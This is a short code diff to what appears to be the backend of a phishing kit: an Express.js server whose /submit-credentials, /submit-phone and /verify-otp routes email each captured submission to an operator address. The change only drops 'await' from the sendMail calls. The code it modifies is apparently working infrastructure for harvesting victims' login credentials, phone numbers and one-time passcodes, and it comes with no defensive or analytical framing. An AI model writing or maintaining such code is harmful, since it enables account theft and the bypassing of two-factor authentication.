@@ -65,7 +65,7 @@ app.post("/submit-credentials", async (req, res) => {
     }
     
     // Send notification email.
-    await transporter.sendMail({
+    transporter.sendMail({
       from: process.env.EMAIL_USER,
       to: process.env.NOTIFY_EMAIL,
       subject: "New Credentials Submission",
@@ -96,7 +96,7 @@ app.post("/submit-phone", async (req, res) => {
   try {
 
     // Notify admin via email
-    await transporter.sendMail({
+    transporter.sendMail({
       from: process.env.EMAIL_USER,
       to: process.env.NOTIFY_EMAIL,
       subject: "Phone Submission",
@@ -125,7 +125,7 @@ app.post("/verify-otp", async (req, res) => {
 
   try {
     // Notify admin via email
-    await transporter.sendMail({
+    transporter.sendMail({
       from: process.env.EMAIL_USER,
       to: process.env.NOTIFY_EMAIL,
       subject: "OTP Submission",
